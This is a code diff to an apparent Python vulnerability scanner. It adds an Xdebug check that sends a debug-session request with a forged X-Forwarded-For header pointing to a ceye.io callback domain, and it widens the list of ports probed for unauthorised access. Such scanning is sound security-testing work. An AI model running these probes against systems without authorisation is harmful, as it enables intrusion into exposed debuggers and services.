@@ -172,10 +172,24 @@ def connZookeeper(host,port = 2181):
     except Exception as e:
         return False
 
+def connXdebug(host):
+    try:
+        headers = {'X-Forwarded-For':host+'.'+config.ceye_path}
+        # print(headers)
+        s = requests.get('http://{}/?XDEBUG_SESSION_START=phpstrom'.format(host),headers = headers)
+        if s.status_code == 200:
+            return 'Xdebug Check the ceye.io'
+        else:
+            return False
+    except Exception as e:
+        return False
+
 def poc(url):
     poc_type = 'tools:unauthorized'
 
-    ports = ['3306','22','6379','27017','11211','9200','8080','50070','5984','2375','2181','8088']
+    ports = ['3306','22','6379','27017','11211','9200','8080','50070','5984','2375','2181','8088','9000','80']
+
+    # ports = ['80']
 
     port_info = {}
 
@@ -215,6 +229,12 @@ def poc(url):
         elif port == '8088':
             data = rceHadoop(url)
             port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
+        elif port == '80' or port == '8080':
+            data = connXdebug(url)
+            if port=='8080':
+                port_info[port+'_xdebug'] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
+            else:
+                port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
             
     return port_info
 
